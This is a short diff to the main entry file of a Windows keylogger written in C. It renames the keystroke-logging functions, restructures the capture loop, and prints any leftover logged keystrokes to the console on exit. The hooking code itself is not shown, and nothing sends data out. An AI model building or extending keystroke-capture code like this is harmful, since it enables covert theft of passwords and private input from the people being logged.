@@ -1,7 +1,6 @@
 #include "WinKeylogger.h"
 #include <stdio.h>
 
-
 int APIENTRY WinMain(
                      HINSTANCE hInstance,
                      HINSTANCE hPrevInstance,
@@ -18,12 +17,18 @@ int APIENTRY WinMain(
     StartWinKeylogger();
 
     size_t buflen = 0;
-    while (ReadNextCharToInputBuffer(&buflen))
+    while (LogNextKeystroke(&buflen)) {
         if (buflen == INPUT_BUFFER_SIZE - 1) {
-            StrCpyFullBuffer(tmp_buff);
+            StrCpyLoggedBuffer(tmp_buff);
             wprintf(L"%s\n",  tmp_buff);
             buflen = 0;
         }
+    }
+
+    if (buflen) {
+        StrCpyLoggedBuffer(tmp_buff);
+        wprintf(L"BUFLEN: %u, %s\n",  buflen, tmp_buff);
+    }
 
     RemoveWinKeylogger();
     return 0;
